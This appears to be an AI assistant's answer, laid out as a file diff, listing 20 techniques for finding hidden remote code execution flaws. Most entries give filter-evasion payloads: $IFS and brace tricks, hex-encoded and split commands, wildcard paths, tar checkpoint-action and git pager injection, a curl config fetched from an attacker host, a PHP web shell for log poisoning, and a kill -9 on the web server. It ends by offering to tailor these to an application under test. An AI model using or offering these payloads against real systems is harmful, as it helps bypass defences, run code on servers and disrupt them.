@@ -1,0 +1,129 @@
+To find deep, hidden Remote Code Execution (RCE) vulnerabilities that standard scanners and average security researchers miss, you must look beyond basic command separators. Elite bug hunters target obscure parsers, unexpected binary behaviors, logic flaws in how arguments are split, or alternative interpretation layers.
+Below are 20 highly advanced methodologies, edge cases, and techniques for uncovering hidden RCE.
+------------------------------
+## I. Advanced Shell & Parameter Manipulation## 1. Internal Field Separator ($IFS) Permutations
+WAFs regularly block spaces, but many researchers don't realize that standard bash uses $IFS as a default field splitter. If $IFS alone is blocked, you can use specialized variations to bypass filters.
+
+* Technique: Use positional parameters or alternate sequence slicing.
+* Payloads: $IFS$9, ${IFS}, or __text__$IFS__command__
+
+## 2. Shell Brace Expansion
+When spaces, $IFS, and special characters are stripped entirely, Unix shells allow you to group a command and its parameters inside a comma-separated brace block.
+
+* Technique: The shell automatically unpacks the commas into standard command arguments.
+* Payload: {echo,hello} or {sleep,10}
+
+## 3. Hex/Octal Encoding via Unquoted Strings
+If an application sanitizes alphabet characters or filters specific command strings like cat or id, you can feed the shell raw octal or hexadecimal values that bypass string-matching engines entirely.
+
+* Technique: Pass the command via an unquoted printf wrapper.
+* Payload: $(printf+'\x69\x64') (executes id)
+
+## 4. Variable Concatenation & Slicing
+Modern detection engines look for explicit strings like /etc/passwd or whoami. You can dynamically construct these words at runtime by slicing default environment variables or piecing empty variables together.
+
+* Technique: Split forbidden strings using uninitialized variables.
+* Payload: w${x}h${y}o${z}a${a}m${b}i or a=who;b=ami;$a$b
+
+## 5. Wildcard Blobs for Path Obfuscation
+When system paths or explicit binary names are blacklisted, Unix globbing (wildcards) can bypass path restrictions while still hitting the target system binary precisely.
+
+* Technique: Replace characters with ? (matches any single character) or * (matches multiple).
+* Payload: /???/w??a?? (triggers /usr/bin/whoami or /bin/whoami)
+
+------------------------------
+## II. Argument Injection (No Shell Required)## 6. Argument Hijacking via Array Execution
+When backends use safe functions (like Python’s subprocess.Popen with shell=False or Node’s execFile), traditional shell characters like ; or && do nothing. The input is safely passed as an argument. However, if you can inject CLI flags, you can hijack the application logic.
+
+* Technique: Treat the parameter as an option flag rather than data.
+* Payload: --config=/path/to/malicious/file or --output=/var/www/html/shell.php
+
+## 7. Tar/Archive Checkpoint Injection
+If the backend application takes user input to name files that are immediately passed to a local backup or archiving process (like tar).
+
+* Technique: Inject specific flags that execute custom commands during the archive routine.
+* Payload: --checkpoint=1 combined with --checkpoint-action=exec=sh+malicious.sh
+
+## 8. Git Hook/Configuration Execution
+If an endpoint handles repository initializations, code registrations, or interacts with git commands natively.
+
+* Technique: Use argument injection to override configuration properties that trigger external commands upon execution.
+* Payload: -c+core.pager=whoami
+
+## 9. Curl/Wget Config File Overrides
+If the application uses a command-line downloader utility under the hood to fetch avatar URLs or external codes.
+
+* Technique: Inject an instruction flag that tells the utility to load a malicious configuration file from an external source.
+* Payload: --config+http://your-attacker-ip/malicious.conf
+
+------------------------------
+## III. Logic Flaws & Parser Impedance Matches## 10. HTTP Parameter Pollution (HPP) Split Execution
+Some application infrastructures use an upstream proxy that handles parameters differently than the backend application logic.
+
+* Technique: Split your command injection across two identical parameter keys.
+* Payload: ?code=who&code=ami (where the upstream validates who as safe, but the backend concatenates them into whoami).
+
+## 11. Multibyte Character Encoding Confusion
+Web Application Firewalls often evaluate requests strictly in standard ASCII or UTF-8 formats. If the backend application processes input using alternative character sets (like Shift-JIS or EUC-KR), you can smuggle shell characters.
+
+* Technique: Use the first half of a multibyte character to consume a filtering quote or backslash character.
+* Payload: Smuggling a %e5 byte to break strings.
+
+## 12. Double URL/Hex Encoding for Inner Parsers
+If the backend application passes your input through multiple internal microservices before it reaches the execution point, it may undergo multiple decoding iterations.
+
+* Technique: Double-encode or triple-encode your shell separators.
+* Payload: Tracing %253B (which decodes first to %3B, then to a literal ; right before execution).
+
+## 13. TOCTOU (Time-of-Check to Time-of-Use) Parameters
+An application might perform strict validation on your input parameter when the request first hits the application layer, but pull a refreshed value from a session, database, or cache right before processing.
+
+* Technique: Modify the code concurrently across two asynchronous fast-requests to bypass the initial check while delivering the payload to the execution step.
+
+------------------------------
+## IV. Protocol & Underlying Handler Exploitation## 14. Server-Side Template Injection (SSTI) Evaluation
+If the registration code parameter handles dynamic text generation, confirmation emails, or internal logging templates.
+
+* Technique: Inject template engine syntax to escape the application sandboxing and run code via the language's native runtime environment.
+* Payload: ${7*7} or {{7*7}} (Looking for a math output of 49 to confirm processing).
+
+## 15. Insecure Deserialization via Encoded Tokens
+If the parameter YOURCODE is decoded into an object structure rather than evaluated as a plain string, it may contain serialized application components.
+
+* Technique: Alter the properties of the serialized structure to call internal native gadget chains that run system commands upon instantiation.
+
+## 16. Local File Inclusion (LFI) to RCE via Log Poisoning
+If the code parameter can be forced to throw predictable errors that get written directly to the application server's access logs.
+
+* Technique: Inject executable server code (like <?php system($_GET['cmd']); ?>) into the parameter, causing it to log, and then use an inclusion flaw to execute that log file. [1, 2] 
+
+## 17. Wrapper Protocol Exploitation
+If the processing backend passes your input parameter straight into standard file-opening or streaming functions.
+
+* Technique: Move away from standard paths and leverage built-in language protocols.
+* Payload: Using php://input or data://text/plain;base64,... to stream executable data directly into the execution flow. [3] 
+
+------------------------------
+## V. Asynchronous & Blind Network Verification## 18. Asynchronous Worker Queue Delay Testing
+In massive enterprise setups, inputs from forms are handled via decoupled queue systems (like RabbitMQ) and processed by back-end workers minutes later.
+
+* Technique: Traditional time-based testing fails because the initial HTTP response returns an immediate 200 OK. You must use massive time delays (sleep 300) and look for deviations in background database processing loops.
+
+## 19. Out-of-Band (OOB) via Non-Standard Network Channels
+Firewalls heavily restrict outbound DNS (port 53) and HTTP (ports 80/443) on highly secure internal servers.
+
+* Technique: Force network callbacks using protocols that security administrators routinely forget to restrict.
+* Payload: Force connections over NTP (Port 123), LDAP (Port 389), or NetBIOS (Port 137).
+
+## 20. Process-Termination State Responses
+If the application drops inbound connections or strictly sanitizes network operations, you can monitor how the server physically closes the TCP stream.
+
+* Technique: Inject an unconditional terminate or crash command (such as kill -9 on the web server process).
+* Result: If the server instantly drops the connection with an empty TCP Reset (RST) packet rather than a standard HTTP 500 error page, you have verified command processing. [4] 
+
+------------------------------
+If you are currently evaluating an application and want to narrow down which of these 20 techniques applies best, let me know:
+
+* What web server response code (e.g., 200, 400, 403, 500) do you get when you input abnormal characters?
+* Do you know if the platform is built on Windows or Linux?
+
